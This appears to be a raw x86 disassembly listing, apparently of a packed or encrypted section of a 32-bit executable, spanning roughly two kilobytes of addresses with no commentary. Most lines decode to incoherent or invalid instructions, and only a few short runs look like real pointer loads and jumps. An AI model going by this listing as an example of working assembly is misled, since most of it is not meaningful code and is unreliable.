  40400c:	sub    DWORD PTR [ecx+0x27239d34],ecx
  404012:	add    esp,edi
  404014:	jns    0x404003
  404016:	(bad)  
  404017:	jne    0x403fe9
  404019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40401a:	or     bh,bh
  40401c:	sahf   
  40401d:	mov    fs,WORD PTR [edx]
  40401f:	leave  
  404020:	arpl   di,cx
  404022:	xchg   esi,eax
  404023:	and    dl,BYTE PTR [edi+ecx*2+0x218323d]
  40402a:	xchg   esp,eax
  40402b:	pop    ds
  40402c:	lock push ecx
  40402e:	and    al,0x55
  404030:	pusha  
  404031:	mov    ebx,0xc6f00e89
  404036:	iret   
  404037:	ins    BYTE PTR es:[edi],dx
  404038:	(bad)  
  404039:	pop    ebp
  40403a:	imul   eax,DWORD PTR [esi+eax*2-0xd],0x3
  40403f:	sub    dh,BYTE PTR [eax]
  404041:	fcmovb st,st(1)
  404043:	add    ch,bl
  404045:	aaa    
  404046:	test   eax,0xd7e132fb
  40404b:	add    DWORD PTR [eax+0x56b8774d],ecx
  404051:	cmp    al,0x51
  404053:	bound  ecx,QWORD PTR [ebp+0x2b]
  404056:	adc    al,0xfe
  404058:	int3   
  404059:	lods   eax,DWORD PTR ds:[esi]
  40405a:	jb     0x4040a4
  40405c:	xchg   edx,eax
  40405d:	inc    edx
  40405e:	jl     0x404041
  404060:	ds mov cl,0x31
  404063:	in     eax,dx
  404064:	clc    
  404065:	cmc    
  404066:	dec    ebp
  404067:	fistp  QWORD PTR [edx+0x1002fb48]
  40406d:	sti    
  40406e:	nop
  40406f:	cmp    eax,0xa93a9a7f
  404074:	or     cl,BYTE PTR [ecx+0xf60467e]
  40407a:	xor    dh,BYTE PTR [ebx+0x18]
  40407d:	or     cl,BYTE PTR [edx+0x5d]
  404080:	(bad)  
  404081:	les    ebx,FWORD PTR [eax+eax*2+0x20]
  404085:	std    
  404086:	mov    ecx,?
  404088:	adc    esp,ebp
  40408a:	rcr    DWORD PTR [ecx],1
  40408c:	bnd jge 0x4040a4
  40408f:	hlt    
  404090:	sbb    ebp,edx
  404092:	arpl   WORD PTR es:[eax],di
  404095:	mov    eax,edi
  404097:	rcl    al,1
  404099:	fadd   st,st(3)
  40409b:	dec    edi
  40409c:	and    DWORD PTR [ebx+edi*8+0x39],ebp
  4040a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040a1:	adc    al,0x4d
  4040a3:	stc    
  4040a4:	loope  0x40410e
  4040a6:	mov    edi,ebp
  4040a8:	jmp    FWORD PTR [ebp+edi*8+0x6e]
  4040ac:	setae  BYTE PTR [edx]
  4040af:	arpl   WORD PTR [esi+0x3f838cb3],sp
  4040b5:	xchg   BYTE PTR [ecx],dl
  4040b7:	aam    0xf4
  4040b9:	jo     0x404129
  4040bb:	iret   
  4040bc:	(bad)  
  4040bd:	mov    eax,ds:0xf4cced42
  4040c2:	add    ah,ah
  4040c4:	sbb    al,0x8b
  4040c6:	push   cs
  4040c7:	je     0x404143
  4040c9:	xor    ebp,ecx
  4040cb:	rcr    DWORD PTR [edx+esi*8],1
  4040ce:	repz inc edx
  4040d0:	or     BYTE PTR [edx],dh
  4040d2:	xchg   ebx,eax
  4040d3:	fisub  DWORD PTR [ecx-0x6608853e]
  4040d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040da:	xor    ebx,DWORD PTR [edi]
  4040dc:	mov    bh,0x69
  4040de:	cld    
  4040df:	loope  0x404093
  4040e1:	imul   eax,DWORD PTR [eax-0x20],0xaeb7f3d2
  4040e8:	clc    
  4040e9:	mov    ebx,0x18763635
  4040ee:	pop    edi
  4040ef:	sbb    eax,0xb5142c13
  4040f4:	pop    ds
  4040f5:	push   ebp
  4040f6:	ds inc edx
  4040f8:	cdq    
  4040f9:	frstor ds:0xa430573a
  4040ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404100:	xor    bh,cl
  404102:	xchg   DWORD PTR ds:0x1b4d71f3,edx
  404108:	fcmove st,st(4)
  40410a:	in     eax,0x40
  40410c:	cmp    BYTE PTR [edi+esi*8-0x41],bh
  404110:	lahf   
  404111:	pop    ss
  404112:	inc    eax
  404113:	mov    al,0xdd
  404115:	xor    al,0x4a
  404117:	sbb    bh,BYTE PTR [ebp+0x490b7cb1]
  40411d:	mov    bh,0x9c
  40411f:	inc    ebp
  404120:	xlat   BYTE PTR ds:[ebx]
  404121:	(bad)  
  404122:	pop    es
  404123:	cwde   
  404124:	bound  esi,QWORD PTR [esi+0x3f]
  404127:	lods   eax,DWORD PTR ds:[esi]
  404128:	mov    ebp,0x1b4609a9
  40412d:	lahf   
  40412e:	jle    0x404117
  404130:	cmp    al,0xfd
  404132:	push   0x62
  404134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404135:	mov    esp,0x263384dd
  40413a:	xchg   ebx,eax
  40413b:	popf   
  40413c:	mov    ds:0x52eaa3f0,eax
  404141:	arpl   WORD PTR [edi+0x20],cx
  404144:	mov    bh,0xad
  404146:	xchg   edi,eax
  404147:	adc    ebx,esp
  404149:	out    dx,eax
  40414a:	repnz fild QWORD PTR [ecx+edi*4]
  40414e:	jg     0x404195
  404150:	or     bl,BYTE PTR [ebp-0x6c]
  404153:	rol    BYTE PTR [eax+eax*4-0x79],cl
  404157:	mov    bl,BYTE PTR [ecx+ebx*2-0x46c594a9]
  40415e:	sbb    ecx,DWORD PTR [esi-0x1502cf9a]
  404164:	lds    eax,FWORD PTR [edi]
  404166:	cwde   
  404167:	out    dx,eax
  404168:	jo     0x4041cd
  40416a:	or     cl,BYTE PTR ds:0x14693818
  404170:	jne    0x40419b
  404172:	lods   al,BYTE PTR ds:[esi]
  404173:	push   eax
  404174:	test   eax,0x44f8e262
  404179:	das    
  40417a:	push   ebx
  40417b:	ret    0x4de2
  40417e:	push   0xffffffe0
  404180:	jns    0x404171
  404182:	sbb    al,0xed
  404184:	cwde   
  404185:	loope  0x4041a8
  404187:	inc    esp
  404188:	inc    edi
  404189:	popf   
  40418a:	lds    esp,FWORD PTR [esi-0x2c35a4d7]
  404190:	fadd   st,st(2)
  404192:	in     al,0xe1
  404194:	lock or BYTE PTR [esi+ebp*2],cl
  404198:	sbb    DWORD PTR [ecx-0x1a94bfc2],esi
  40419e:	adc    ch,0x7b
  4041a1:	prefetch BYTE PTR [eax+0x1ba2149f]
  4041a8:	addr16 mov ds:0xce5c,eax
  4041ac:	retf   0xd6b1
  4041af:	mov    edx,0x185c8b6e
  4041b4:	xchg   esp,eax
  4041b5:	(bad)  
  4041b6:	repnz cdq 
  4041b8:	loop   0x4041fc
  4041ba:	xchg   ecx,eax
  4041bb:	mov    fs,WORD PTR [eax-0x68b4296]
  4041c1:	or     cl,0x2a
  4041c4:	hlt    
  4041c5:	add    DWORD PTR [edx+edx*8+0x15],edx
  4041c9:	in     al,dx
  4041ca:	rcl    BYTE PTR [edi-0x7b74aaf1],0xb4
  4041d1:	div    BYTE PTR [edx]
  4041d3:	je     0x404176
  4041d5:	push   ecx
  4041d6:	(bad)  
  4041d7:	aad    0x19
  4041d9:	mov    WORD PTR [eax-0x5d],ds
  4041dc:	inc    ecx
  4041dd:	stos   DWORD PTR es:[edi],eax
  4041de:	sbb    BYTE PTR [esi+0x11],cl
  4041e1:	pop    ecx
  4041e2:	inc    eax
  4041e3:	scas   eax,DWORD PTR es:[edi]
  4041e4:	mov    WORD PTR [ecx],ss
  4041e6:	xchg   ebp,eax
  4041e7:	int3   
  4041e8:	jp     0x40421a
  4041ea:	mov    ds:0xa91f3ede,eax
  4041ef:	mov    esi,0x90ab3594
  4041f4:	push   es
  4041f5:	inc    ebx
  4041f6:	outs   dx,DWORD PTR ds:[esi]
  4041f7:	leave  
  4041f8:	cli    
  4041f9:	shl    BYTE PTR [ebx+0x73c25ee7],cl
  4041ff:	fbld   TBYTE PTR [edx+0xb]
  404202:	push   esp
  404203:	jne    0x404252
  404205:	cld    
  404206:	scas   al,BYTE PTR es:[edi]
  404207:	call   0x7396423c
  40420c:	popa   
  40420d:	in     eax,dx
  40420e:	mov    al,0x87
  404210:	sar    esi,1
  404212:	or     bh,bh
  404214:	jne    0x4041fe
  404216:	mov    eax,ds:0x413c9a
  40421b:	mov    eax,DWORD PTR [eax]
  40421d:	push   DWORD PTR [eax]
  40421f:	lea    eax,ds:0x413cb6
  404225:	push   DWORD PTR [eax]
  404227:	lea    eax,ds:0x413a62
  40422d:	push   DWORD PTR [eax]
  40422f:	lea    eax,ds:0x413c96
  404235:	jmp    0x404643
  40423a:	out    0xed,eax
  40423c:	sahf   
  40423d:	(bad)  
  40423e:	mov    ah,0x55
  404240:	addr16 in eax,dx
  404242:	push   edi
  404243:	sub    DWORD PTR [bx+si+0x42],0xffffffbc
  404248:	xor    esi,DWORD PTR [esi]
  40424a:	aad    0x25
  40424c:	jle    0x4042cc
  40424e:	outs   dx,DWORD PTR ds:[esi]
  40424f:	jge    0x4042cf
  404251:	jle    0x404276
  404253:	mov    ebp,0x4eb237cb
  404258:	push   eax
  404259:	jnp    0x40426c
  40425b:	ja     0x4042dc
  40425d:	xchg   ebx,eax
  40425e:	inc    eax
  40425f:	cdq    
  404260:	outs   dx,BYTE PTR ds:[esi]
  404261:	inc    ebp
  404262:	pop    esp
  404263:	sbb    esp,DWORD PTR [edx]
  404265:	push   eax
  404266:	mov    bh,0xef
  404268:	inc    esi
  404269:	cmp    al,0x33
  40426b:	jnp    0x404273
  40426d:	xchg   esi,eax
  40426e:	std    
  40426f:	int    0xeb
  404271:	in     al,dx
  404272:	and    edx,DWORD PTR [esi+0x10]
  404275:	(bad)  
  404276:	adc    ebp,DWORD PTR [edx+ebx*2+0x251cff0a]
  40427d:	ror    DWORD PTR [eax+eax*4+0x5bf66e48],1
  404284:	xor    al,0xcf
  404286:	hlt    
  404287:	(bad)
  40428b:	mov    esi,0x7a6d41d8
  404290:	push   ds
  404291:	rcl    DWORD PTR [edx],1
  404293:	xchg   esi,eax
  404294:	popf   
  404295:	outs   dx,DWORD PTR ds:[esi]
  404296:	fistp  DWORD PTR [edi-0x25c40b9b]
  40429c:	in     eax,dx
  40429d:	mov    ah,BYTE PTR [ebp+0x659379ff]
  4042a3:	cmp    BYTE PTR [esi+0x18b69999],ah
  4042a9:	ss sti 
  4042ab:	pop    esp
  4042ac:	stos   DWORD PTR es:[edi],eax
  4042ad:	mov    eax,0x82f34adc
  4042b2:	ja     0x4042c8
  4042b4:	retf   0x56fb
  4042b7:	ins    BYTE PTR es:[edi],dx
  4042b8:	jno    0x40426c
  4042ba:	sub    BYTE PTR [edi],0x95
  4042bd:	or     esp,DWORD PTR [esi+0x40d98996]
  4042c3:	inc    edi
  4042c4:	dec    ecx
  4042c5:	neg    BYTE PTR [ebx+0x3f9dca38]
  4042cb:	dec    edx
  4042cc:	nop
  4042cd:	test   eax,0x7430076
  4042d2:	ins    DWORD PTR es:[edi],dx
  4042d3:	stos   DWORD PTR es:[edi],eax
  4042d4:	out    0x5b,al
  4042d6:	scas   al,BYTE PTR es:[edi]
  4042d7:	mov    cl,0xb7
  4042d9:	lods   eax,DWORD PTR ds:[esi]
  4042da:	mov    WORD PTR [esi-0x289d3bce],fs
  4042e0:	jbe    0x4042d8
  4042e2:	mov    ds:0xe7a94338,eax
  4042e7:	jge    0x404313
  4042e9:	inc    edx
  4042ea:	fdivr  DWORD PTR [ecx]
  4042ec:	sti    
  4042ed:	sbb    DWORD PTR [edx],eax
  4042ef:	cmp    DWORD PTR [eax+0x53aa90b],ebx
  4042f5:	pop    edi
  4042f6:	jle    0x4042d0
  4042f8:	adc    DWORD PTR [esi-0x1312e1ff],edx
  4042fe:	jbe    0x4042b6
  404300:	jmp    0x4042d8
  404302:	pop    ebp
  404303:	xchg   edx,eax
  404304:	gs xchg ebx,eax
  404306:	adc    eax,0xffc81ea5
  40430b:	loopne 0x404342
  40430d:	jecxz  0x40436f
  40430f:	call   0x44d1965b
  404314:	add    dh,al
  404316:	sahf   
  404317:	sub    al,BYTE PTR [eax]
  404319:	xor    BYTE PTR [edi],bl
  40431b:	nop
  40431c:	or     DWORD PTR [ebx],esp
  40431e:	rol    DWORD PTR [esi+0x777842d2],1
  404324:	xchg   ebp,eax
  404325:	pop    ss
  404326:	add    eax,0xdaac446f
  40432b:	cli    
  40432c:	iret   
  40432d:	sti    
  40432e:	std    
  40432f:	pop    ecx
  404330:	push   cs
  404331:	pop    ds
  404332:	lods   eax,DWORD PTR ds:[esi]
  404333:	shl    ch,1
  404335:	adc    BYTE PTR cs:[edx+ebx*4],0x7f
  40433a:	jmp    0xe479edf7
  40433f:	push   cs
  404340:	xchg   BYTE PTR [ebp+0x27],bl
  404343:	daa    
  404344:	call   0xbb96:0xf3e3d1da
  40434b:	cli    
  40434c:	cmp    BYTE PTR [ebp+0x366528cd],ch
  404352:	mov    esi,0x9f6be33e
  404357:	retf   0x2ee8
  40435a:	leave  
  40435b:	(bad)  
  40435c:	scas   eax,DWORD PTR es:[edi]
  40435d:	push   0x10116ff9
  404362:	push   0x66
  404364:	dec    ecx
  404365:	add    al,0x63
  404367:	inc    eax
  404368:	fadd   DWORD PTR [ecx-0x4389fae2]
  40436e:	(bad)  
  40436f:	in     al,0x71
  404371:	inc    esi
  404372:	loope  0x4043df
  404374:	clc    
  404375:	ins    DWORD PTR es:[edi],dx
  404376:	sbb    DWORD PTR [ecx-0x4b8aff3d],eax
  40437c:	enter  0xd5c9,0x2c
  404380:	jne    0x40431d
  404382:	sbb    ecx,DWORD PTR [ebx-0x161de64]
  404388:	call   0x8ce03b99
  40438d:	addr16 imul ebp,ebp,0xffffffc2
  404391:	dec    edx
  404392:	inc    esp
  404393:	dec    ebp
  404394:	ror    BYTE PTR [eax-0x42],cl
  404397:	push   0x72
  404399:	mov    eax,0x40d29576
  40439e:	pop    edx
  40439f:	fs out dx,al
  4043a1:	pop    ebp
  4043a2:	out    0x7,eax
  4043a4:	aad    0xcb
  4043a6:	cmp    eax,0xeaa2c9
  4043ab:	bound  eax,QWORD PTR [esi+0x189bec76]
  4043b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043b2:	fidiv  WORD PTR [edi]
  4043b4:	(bad)  
  4043b5:	push   edx
  4043b6:	(bad)  
  4043b8:	push   ebp
  4043b9:	rcl    BYTE PTR [ecx+0x3fa3d5e9],0x1
  4043c0:	cmc    
  4043c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043c2:	jno    0x404392
  4043c4:	jne    0x404391
  4043c6:	mov    WORD PTR [ebp+0x5760a834],fs
  4043cc:	add    esi,DWORD PTR [eax+esi*8]
  4043cf:	cli    
  4043d0:	es adc ch,cl
  4043d3:	or     edx,DWORD PTR [ebp-0x64]
  4043d6:	repz fdivr st(4),st
  4043d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4043da:	dec    ebx
  4043db:	sahf   
  4043dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043dd:	pusha  
  4043de:	scas   al,BYTE PTR es:[edi]
  4043df:	jo     0x4043ff
  4043e1:	test   esi,ecx
  4043e3:	enter  0xda23,0xa7
  4043e7:	outs   dx,BYTE PTR ds:[esi]
  4043e8:	jne    0x4043b8
  4043ea:	push   esp
  4043eb:	cs ffreep st(2)
  4043ee:	xchg   edi,eax
  4043ef:	xlat   BYTE PTR ds:[ebx]
  4043f0:	xor    ecx,DWORD PTR [eax+0x33]
  4043f3:	push   esp
  4043f4:	fucomp st(1)
  4043f6:	xchg   edx,eax
  4043f7:	mov    edx,0x9f83d367
  4043fc:	jl     0x4043cd
  4043fe:	xor    BYTE PTR [ecx+0xe9d1a32],al
  404404:	ret    0xe2b5
  404407:	test   BYTE PTR [edx],bl
  404409:	jnp    0x404395
  40440b:	sbb    eax,DWORD PTR [ecx-0xc6da653]
  404411:	retf   0x18fb
  404414:	jmp    0xa96f4b5b
  404419:	adc    bl,cl
  40441b:	je     0x404421
  40441d:	and    ebp,edi
  40441f:	sbb    dl,al
  404421:	inc    esi
  404422:	and    eax,0xbc4cf629
  404427:	imul   ebx,DWORD PTR [eax+0x75b7ca9d],0xcc9ac874
  404431:	add    BYTE PTR [ecx-0xb15bf1],ch
  404437:	aas    
  404438:	ss jno 0x4044aa
  40443b:	ja     0x404442
  40443d:	push   edx
  40443e:	icebp  
  40443f:	dec    edx
  404440:	mov    esp,0xe482e690
  404445:	mov    ecx,0xda62b425
  40444a:	aaa    
  40444b:	aaa    
  40444c:	xchg   edx,eax
  40444d:	(bad)  
  40444e:	mov    ah,0xf5
  404450:	ret    
  404451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404452:	loop   0x40440f
  404454:	into   
  404455:	test   BYTE PTR [ebx+0x5321fe77],dl
  40445b:	adc    DWORD PTR [edi],ebp
  40445d:	push   ecx
  40445e:	sub    esi,edx
  404460:	sbb    al,0xc4
  404462:	inc    esp
  404463:	inc    cl
  404465:	fmulp  st(1),st
  404468:	cmp    eax,0xfc397b5b
  40446d:	into   
  40446e:	(bad)  
  40446f:	jmp    0x7b5d7e1a
  404474:	pop    esi
  404475:	fidiv  WORD PTR [edi-0xe1bee8]
  40447b:	call   0x9a4a:0xa92e0b9d
  404482:	xchg   ecx,eax
  404483:	sub    BYTE PTR [edx],bl
  404485:	sahf   
  404486:	aad    0xa2
  404488:	jmp    0x1593:0xa9929779
  40448f:	cmp    BYTE PTR [ebx+0x56e1dde3],ah
  404495:	retf   
  404496:	jmp    0x4ed587c
  40449b:	sub    bl,ch
  40449d:	cwde   
  40449e:	inc    edx
  40449f:	adc    al,0xf9
  4044a1:	inc    eax
  4044a2:	call   0x9d49ca87
  4044a7:	inc    ebp
  4044a8:	daa    
  4044a9:	into   
  4044aa:	rcl    ebx,cl
  4044ac:	mov    eax,0xa3082efc
  4044b1:	frstor [eax+0x1a]
  4044b4:	sub    BYTE PTR [eax-0x3f0b05fb],bh
  4044ba:	push   ebx
  4044bb:	idiv   BYTE PTR ds:0x1799e826
  4044c1:	icebp  
  4044c2:	cmp    al,0x37
  4044c4:	(bad)  
  4044c6:	hlt    
  4044c7:	mov    ebp,0xb38d88ca
  4044cc:	inc    edx
  4044cd:	jp     0x404484
  4044cf:	inc    esp
  4044d0:	jnp    0x404539
  4044d2:	add    BYTE PTR [ecx-0x19],al
  4044d5:	stos   DWORD PTR es:[edi],eax
  4044d6:	fwait
  4044d7:	mov    eax,ds:0xb4df99a3
  4044dc:	cmp    BYTE PTR ds:0xc3e4b39c,dh
  4044e2:	sti    
  4044e3:	or     dl,BYTE PTR [eax]
  4044e5:	sbb    dh,dh
  4044e7:	dec    edx
  4044e8:	add    eax,0xaafa1cf1
  4044ed:	inc    cx
  4044ef:	int    0xd1
  4044f1:	push   0x3ea364a
  4044f6:	ss addr16 add eax,0x153bcad7
  4044fd:	adc    eax,edi
  4044ff:	aad    0x5d
  404501:	add    BYTE PTR [ecx],0xb9
  404504:	cmp    eax,0x6ea025f9
  404509:	in     al,dx
  40450a:	jg     0x404560
  40450c:	mov    al,0x6e
  40450e:	pushf  
  40450f:	imul   BYTE PTR [esi-0x561bb8c5]
  404515:	das    
  404516:	xchg   esi,eax
  404517:	xor    dh,al
  404519:	xor    cl,BYTE PTR [ecx+eiz*2+0x7]
  40451d:	lock push ds
  40451f:	xchg   ebp,eax
  404520:	dec    edx
  404521:	adc    dl,BYTE PTR [ebp-0x5a]
  404524:	out    0x84,al
  404526:	jb     0x4044d3
  404528:	pop    ds
  404529:	nop
  40452a:	jo     0x40452f
  40452c:	out    dx,eax
  40452d:	fdiv   DWORD PTR [ebx+eax*8+0x15]
  404531:	add    esp,DWORD PTR [ebx+ebx*4-0x56]
  404535:	xor    esi,eax
  404537:	test   eax,0xfb256ea9
  40453c:	lea    edi,[edi-0x35]
  40453f:	jmp    0x94ebfbd6
  404544:	jns    0x4044f2
  404546:	xchg   edi,eax
  404547:	add    al,0x4d
  404549:	sbb    DWORD PTR [edi+0x4],0x27
  40454d:	jb     0x404531
  40454f:	int    0xb5
  404551:	or     esp,0xbe11e438
  404557:	imul   esi,DWORD PTR [eax+esi*4-0x3470c556],0x2e
  40455f:	es push edx
  404561:	repz pop edx
  404563:	neg    bh
  404565:	test   DWORD PTR [edx+0x6f],edx
  404568:	adc    al,0xc3
  40456a:	sbb    dh,bl
  40456c:	push   edi
  40456d:	mov    edx,DWORD PTR [ebp+0x65]
  404570:	inc    ebp
  404571:	inc    eax
  404572:	mov    bl,BYTE PTR [esi-0x3aa86baf]
  404578:	loope  0x404579
  40457a:	adc    BYTE PTR [ebp-0x34],dh
  40457d:	pop    edi
  40457e:	dec    ecx
  40457f:	mov    dh,0xb9
  404581:	(bad)  
  404582:	jbe    0x404526
  404584:	jno    0x404525
  404586:	sub    ebp,ebx
  404588:	xchg   dl,cl
  40458a:	mov    ds:0xb0bf2164,al
  40458f:	sahf   
  404590:	call   0xf80859c3
  404595:	imul   esi,ecx,0x6cb430cc
  40459b:	cdq    
  40459c:	rcr    BYTE PTR [edi],1
  40459e:	div    BYTE PTR [esi]
  4045a0:	jno    0x4045ca
  4045a2:	push   edi
  4045a3:	pop    es
  4045a4:	psubsw mm3,QWORD PTR [edx]
  4045a7:	sub    DWORD PTR [edx-0x1faf3569],edi
  4045ad:	inc    ebx
  4045ae:	das    
  4045af:	(bad)  
  4045b0:	out    0xd7,al
  4045b2:	in     al,dx
  4045b3:	mov    bl,0x12
  4045b5:	sub    eax,DWORD PTR cs:[ebx]
  4045b8:	cmp    al,0x6a
  4045ba:	inc    edi
  4045bb:	pusha  
  4045bc:	push   ebx
  4045bd:	mov    ebx,0xe9475b9e
  4045c2:	ja     0x404616
  4045c4:	loope  0x40463c
  4045c6:	xchg   edx,eax
  4045c7:	add    WORD PTR [ecx],0xff9f
  4045cb:	fcomp  DWORD PTR ds:0xf386a485
  4045d1:	fist   DWORD PTR [ebp+ebx*8-0x49c365b6]
  4045d8:	mov    bl,0x9a
  4045da:	cmp    ah,BYTE PTR [ecx]
  4045dc:	pop    ecx
  4045dd:	cmp    ecx,edx
  4045df:	sbb    DWORD PTR [eax-0x36],esi
  4045e2:	jno    0x4045f3
  4045e4:	outs   dx,DWORD PTR ds:[esi]
  4045e5:	nop
  4045e6:	mul    bl
  4045e8:	jecxz  0x404635
  4045ea:	mov    ah,al
  4045ec:	mov    edi,DWORD PTR [edi]
  4045ee:	push   cs
  4045ef:	mov    bl,0xb9
  4045f1:	pusha  
  4045f2:	aaa    
  4045f3:	cmp    ah,ch
  4045f5:	(bad)  
  4045f6:	in     al,0xe9
  4045f8:	jne    0x4045b0
  4045fa:	mov    ebx,esp
  4045fc:	imul   edi,DWORD PTR [edi+0x6a],0x1278bf7c
  404603:	pop    ss
  404604:	pushf  
  404605:	xchg   ebx,eax
  404606:	bound  edi,QWORD PTR [esi+0x43]
  404609:	mov    ch,0x8f
  40460b:	jae    0x40464a
  40460d:	pop    ebx
  40460e:	mov    edi,0x6984badf
  404613:	imul   di,WORD PTR [edx-0x46],0x5d
  404618:	into   
  404619:	bound  esp,QWORD PTR [edx-0x3c54247d]
  40461f:	sub    DWORD PTR [ebp+0xa],eax
  404622:	sub    al,0x2d
  404624:	lahf   
  404625:	dec    ebx
  404626:	imul   edi,ebp,0x6e2aa72a
  40462c:	or     ch,BYTE PTR [ecx-0x47cd735]
  404632:	mov    ah,BYTE PTR [ebx]
  404634:	sub    bh,BYTE PTR [ebx-0x748ca038]
  40463a:	ret    
  40463b:	out    0xc1,al
  40463d:	div    BYTE PTR [ebx]
  40463f:	(bad)  
  404640:	jge    0x404678
  404642:	add    edi,edi
  404644:	xor    BYTE PTR [ebp+0x413dc205],cl
  40464a:	add    bh,bh
  40464c:	xor    BYTE PTR [edi+0x534343d3],al
  404652:	pop    eax
  404653:	call   DWORD PTR [eax-0x2]
  404656:	mov    eax,DWORD PTR [ebp-0x38]
  404659:	mov    ecx,DWORD PTR ds:0x413c5a
  40465f:	add    DWORD PTR [eax],ecx
  404661:	jmp    0x404a6f
  404666:	xor    DWORD PTR ds:0xb112a30a,ebx
  40466c:	mov    cl,0xad
  40466e:	jne    0x404697
  404670:	xor    eax,0x328cb1e3
  404675:	bnd ret 0x7e21
  404679:	jle    0x4046ea
  40467b:	jge    0x4046fb
  40467d:	jle    0x404655
  40467f:	int3   
  404680:	imul   esp,DWORD PTR [esi-0x62],0x89ca024a
  404687:	ret    
  404688:	or     edx,DWORD PTR [esi]
  40468a:	cli    
  40468b:	xchg   esi,eax
  40468c:	push   ebp
  40468d:	mov    ?,WORD PTR [edx+0x30]
  404690:	pop    es
  404691:	scas   eax,DWORD PTR es:[edi]
  404692:	sub    esi,DWORD PTR [edi]
  404694:	cwde   
  404695:	push   ss
  404696:	xchg   edx,eax
  404697:	loope  0x40466c
  404699:	sub    bl,bh
  40469b:	pop    eax
  40469c:	fwait
  40469d:	repnz repnz adc ah,BYTE PTR [esp+edx*1-0x4b5054a4]
  4046a6:	ret    0x6244
  4046a9:	mov    dl,0x77
  4046ab:	mov    ebx,0xb4e5c15f
  4046b0:	lock push 0xffffff9b
  4046b3:	scas   al,BYTE PTR es:[edi]
  4046b4:	mov    edi,0xad5a4ab4
  4046b9:	enter  0x681a,0x8c
  4046bd:	xchg   cl,al
  4046bf:	xchg   esp,eax
  4046c0:	sar    cl,cl
  4046c2:	push   cs
  4046c3:	sub    al,0x89
  4046c5:	mov    dl,0xed
  4046c7:	dec    eax
  4046c8:	add    eax,0x32af2b99
  4046cd:	xor    ch,al
  4046cf:	fs sub al,0x52
  4046d2:	js     0x40471e
  4046d4:	enter  0xc91,0xb0
  4046d8:	fdivr  QWORD PTR ds:0x4a77bb7d
  4046de:	and    BYTE PTR ds:0x33476d55,0xe9
  4046e5:	mov    ds:0x823eed87,eax
  4046ea:	xchg   ebx,eax
  4046eb:	pop    edi
  4046ec:	or     esi,DWORD PTR es:[ebx]
  4046ef:	gs adc bl,bl
  4046f2:	dec    ecx
  4046f3:	jmp    0xf5555550
  4046f8:	adc    al,0xfb
  4046fa:	pop    ds
  4046fb:	jp     0x4046af
  4046fd:	pop    eax
  4046fe:	call   0x879f:0x8b230a2
  404705:	loop   0x404733
  404707:	int    0x54
  404709:	ficom  WORD PTR [esi-0x299848ce]
  40470f:	push   DWORD PTR [ecx-0x1f3ea3be]
  404715:	jb     0x404746
  404717:	or     BYTE PTR [edi],0x92
  40471a:	and    eax,0x660a08f3
  40471f:	sub    ch,BYTE PTR [edi+ecx*1]
  404722:	mov    ebx,0xdb7e32e7
  404727:	retf   
  404728:	(bad)  
  404729:	ds cmp ebp,DWORD PTR es:[esi-0xc24c51a]
  404731:	and    eax,0x74e80ee8
  404736:	fisttp DWORD PTR [ebx+0x61bdb599]
  40473c:	and    BYTE PTR [ebx],0xc0
  40473f:	sub    ecx,edi
  404741:	inc    DWORD PTR [edi+0x7fe54483]
  404747:	(bad)
  40474a:	mov    eax,0x60d03bdf
  40474f:	mov    WORD PTR [edx-0x7218efc2],fs
  404755:	cld    
  404756:	sbb    al,0xef
  404758:	rcr    DWORD PTR [esi+0x42],1
  40475b:	sbb    eax,0xdfaa3185
  404760:	test   DWORD PTR [esi],edx
  404762:	mov    DWORD PTR [esp+ebx*1],esi
  404765:	xor    edx,DWORD PTR [eax]
  404767:	in     al,0x21
  404769:	xchg   esi,eax
  40476a:	cmp    ebp,DWORD PTR [edx-0x33]
  40476d:	dec    esi
  40476e:	cdq    
  40476f:	push   ebp
  404770:	xor    DWORD PTR [eax],0xffffff85
  404773:	in     eax,dx
  404774:	mov    esp,cr1
  404777:	leave  
  404778:	push   ecx
  404779:	out    dx,eax
  40477a:	and    bl,cl
  40477c:	mov    edx,0xb71d69e8
  404781:	imul   eax,DWORD PTR [ebp+edx*2+0x45c2261c],0xa5bc02dd
  40478c:	out    0x65,al
  40478e:	xchg   ebx,eax
  40478f:	jmp    0x404768
  404791:	fist   WORD PTR [ecx]
  404793:	mov    ch,0x57
  404795:	rdtsc  
  404797:	sub    cl,BYTE PTR [ecx]
  404799:	inc    ecx
  40479a:	pop    esp
  40479b:	mov    cl,0xa7
  40479d:	cmp    DWORD PTR [ebx-0x78df1d01],eax
  4047a3:	push   cs
  4047a4:	mov    eax,ds:0x1e81c2f9
  4047a9:	int    0xc7
  4047ab:	pop    ss
  4047ac:	mov    ds:0xdab6ef87,eax
  4047b1:	mov    esp,DWORD PTR [esi+ebx*1]
  4047b4:	cmp    esi,0x77
  4047b7:	xor    DWORD PTR [ebx+0x24],0xee220ab1
  4047be:	je     0x404803
  4047c0:	out    dx,eax
  4047c1:	jg     0x40475f
  4047c3:	jp     0x4047d3
  4047c5:	mov    dl,0xf
  4047c7:	push   esp
  4047c8:	icebp  
  4047c9:	aad    0xbe
  4047cb:	add    ebp,eax
  4047cd:	mov    ch,0xa5
  4047cf:	fwait
  4047d0:	aas    
  4047d1:	jnp    0x4047cd
  4047d3:	enter  0xa03c,0x15
  4047d7:	add    bl,bl
  4047d9:	push   es
  4047da:	jo     0x4047e0
  4047dc:	pop    ebx
  4047dd:	jmp    0xfd5b:0x8cdb9e11
  4047e4:	test   ebx,edx
  4047e6:	sahf   
  4047e7:	mov    ebx,0x66373548
  4047ec:	fst    DWORD PTR [esi+0x76]
  4047ef:	dec    esp
  4047f0:	iret   
  4047f1:	std    
  4047f2:	adc    al,0x61
  4047f4:	ja     0x404849
  4047f6:	outs   dx,BYTE PTR ds:[esi]
  4047f7:	or     bh,BYTE PTR [ecx+edi*1+0x591dba8c]
  4047fe:	add    eax,DWORD PTR [esi+0x15]
  404801:	sub    al,0xf6
  404804:	retf   0x9a52
  404807:	dec    edi
